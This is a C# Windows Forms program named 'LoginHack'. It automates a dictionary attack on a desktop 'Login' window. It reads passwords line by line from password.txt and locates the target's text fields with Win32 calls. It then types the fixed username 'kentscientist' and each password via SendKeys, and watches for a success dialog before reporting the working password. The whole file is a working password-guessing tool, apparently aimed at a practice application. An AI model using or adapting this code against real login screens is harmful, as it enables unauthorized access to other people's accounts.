using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace LoginHack
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx", CharSet = CharSet.Auto)]
        public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("user32.dll")]
        public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string passwordFile = "password.txt";

            if (System.IO.File.Exists(passwordFile))
            {
                string line;

                using (System.IO.StreamReader objReader = new System.IO.StreamReader(passwordFile))
                {
                    while ((line = objReader.ReadLine()) != null)
                    {
                        IntPtr clientHandle = FindWindow("WindowsForms10.Window.8.app.0.141b42a_r9_ad1", "Login");

                        if (clientHandle == IntPtr.Zero)
                        {
                            Console.WriteLine("Window Not Captured!");
                        }
                        else
                        {
                            richTextBox1.Text = "";
                            Console.WriteLine("Window Captured");

                            Dictionary<String, IntPtr> dd = GetAllChildrenWindowHandles(clientHandle, 100);

                            foreach (String s in dd.Keys)
                            {
                                richTextBox1.Text += s.Split('-')[0] + "\n";
                            }

                            SetForegroundWindow(dd["WindowsForms10.EDIT.app.0.141b42a_r9_ad1-3"]);
                            SendKeys.SendWait("^A");
                            SendKeys.SendWait("kentscientist");
                            SetForegroundWindow(dd["WindowsForms10.EDIT.app.0.141b42a_r9_ad1-0"]);
                            SendKeys.SendWait("^A");
                            SendKeys.SendWait(line);
                            SetForegroundWindow(dd["WindowsForms10.BUTTON.app.0.141b42a_r9_ad1-4"]);
                            SendKeys.SendWait("{ENTER}");
                            Thread.Sleep(100);

                            IntPtr dialog = FindWindow("#32770", null);

                            if (dialog != IntPtr.Zero)
                            {
                                IntPtr sss = FindWindowEx(dialog, IntPtr.Zero, "Static", "Hello World");
                                IntPtr button = FindWindowEx(dialog, IntPtr.Zero, "Button", "OK");

                                if (button != IntPtr.Zero)
                                {
                                    SendKeys.SendWait("{ENTER}");
                                    if (sss != IntPtr.Zero)
                                    {
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }

                MessageBox.Show("Hello Password = " + line, "Successful Log In");

            }
        }

        private Dictionary<String,IntPtr> GetAllChildrenWindowHandles(IntPtr hParent, int maxCount)
        {
            Dictionary<String, IntPtr> result = new Dictionary<String, IntPtr>();
            int ct = 0;
            IntPtr prevChild = IntPtr.Zero;
            IntPtr currChild = IntPtr.Zero;
            while (ct < maxCount)
            {
                currChild = FindWindowEx(hParent, prevChild, null, null);
                if (currChild == IntPtr.Zero) break;
                StringBuilder className = new StringBuilder(100);
                GetClassName(currChild, className, className.Capacity);
                result.Add(className.ToString() + "-" + ct, currChild);
                prevChild = currChild;
                ++ct;
            }
            return result;
        }
    }
}
